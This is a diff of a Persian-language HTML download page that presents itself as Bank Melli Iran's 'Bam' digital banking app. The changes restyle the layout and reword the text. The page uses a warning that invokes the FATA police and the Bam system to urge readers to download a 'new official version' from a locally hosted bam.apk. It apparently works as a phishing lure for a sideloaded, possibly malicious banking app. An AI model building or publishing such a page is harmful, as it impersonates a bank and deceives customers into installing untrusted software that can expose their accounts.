@@ -12,14 +12,14 @@
 
     body {
       margin: 0;
+      padding: 0;
       background-color: #1a1a1a;
       font-family: 'Vazir', sans-serif;
       color: #fff;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      padding: 16px;
       overflow: hidden;
     }
 
@@ -29,58 +29,59 @@
       justify-content: center;
       max-width: 1000px;
       width: 100%;
-      gap: 32px;
+      padding: 12px;
+      gap: 20px;
       flex-wrap: wrap;
     }
 
     .main-content img {
-      max-width: 250px;
+      max-width: 120px;
       width: 100%;
       height: auto;
-      border-radius: 16px;
+      border-radius: 12px;
     }
 
     .text-box {
       flex: 1;
-      min-width: 260px;
+      min-width: 200px;
       text-align: right;
     }
 
     .text-box h1 {
-      font-size: 32px;
+      font-size: 22px;
       color: #ff7a00;
-      margin-bottom: 12px;
+      margin: 0 0 8px 0;
     }
 
     .text-box h2 {
-      font-size: 16px;
-      font-weight: 400;
+      font-size: 14px;
       color: #ccc;
-      margin-bottom: 16px;
+      margin: 0 0 12px 0;
+      font-weight: normal;
     }
 
     .text-box p {
-      font-size: 14px;
-      line-height: 1.8;
+      font-size: 13px;
+      line-height: 1.6;
       color: #ddd;
-      margin-bottom: 16px;
+      margin: 0 0 12px 0;
     }
 
     .warning {
       background-color: #ffecb3;
       color: #222;
-      padding: 12px;
-      border-radius: 12px;
-      font-size: 13px;
-      margin-bottom: 20px;
+      padding: 10px;
+      border-radius: 10px;
+      font-size: 12px;
       line-height: 1.8;
+      margin-bottom: 12px;
     }
 
     .download-btn {
       background-color: #ff7a00;
       color: #fff;
-      padding: 12px 24px;
-      font-size: 16px;
+      padding: 10px 20px;
+      font-size: 13px;
       font-weight: bold;
       border: none;
       border-radius: 999px;
@@ -94,15 +95,10 @@
       background-color: #e86900;
     }
 
-    @media (max-width: 768px) {
-      body {
-        padding: 12px;
-      }
-
+    @media (max-width: 480px) {
       .main-content {
         flex-direction: column;
-        text-align: center;
-        gap: 20px;
+        gap: 12px;
       }
 
       .text-box {
@@ -110,29 +106,29 @@
       }
 
       .text-box h1 {
-        font-size: 26px;
+        font-size: 20px;
       }
 
       .text-box h2 {
-        font-size: 15px;
-      }
-
-      .text-box p {
         font-size: 13px;
       }
 
-      .warning {
+      .text-box p {
         font-size: 12px;
-        padding: 10px;
+      }
+
+      .warning {
+        font-size: 11px;
+        padding: 8px;
       }
 
       .download-btn {
-        font-size: 14px;
-        padding: 10px 20px;
+        font-size: 12px;
+        padding: 8px 16px;
       }
 
       .main-content img {
-        max-width: 180px;
+        max-width: 100px;
       }
     }
   </style>
@@ -145,12 +141,13 @@
       <h1>بـــــام</h1>
       <h2>بانکداری دیجیتال بانک ملی ایران</h2>
       <p>
-        بام فقط یه اینترنت‌بانک نیست؛<br>
-        یه پلتفرم بانکداری هوشمنده، امن‌تر، سریع‌تر و شبیه‌تر به شما.
+        بام دیگه فقط یه اینترنت‌ بانک نیست،<br>
+        یه پلتفرم تمام‌عیار بانکداری دیجیتاله:<br>
+        هوشمندتر، امن‌تر، سریع‌تر و حالا شبیه‌تر به شماست.
       </p>
       <div class="warning">
-        ⚠️ برای امنیت بیشتر، اپلیکیشن بام را فقط از لینک زیر دانلود کنید.<br>
-        (طبق هشدارهای رسمی پلیس فتا و سامانه بام)
+        ⚠️ لطفاً با توجه به هشدارهای سامانه بام و پلیس فتا، جهت حفظ امنیت حساب خود،<br>
+        نسخه جدید و رسمی اپلیکیشن را فقط از لینک زیر دانلود نمایید.
       </div>
       <a href="bam.apk" class="download-btn" download>دانلود مستقیم</a>
     </div>
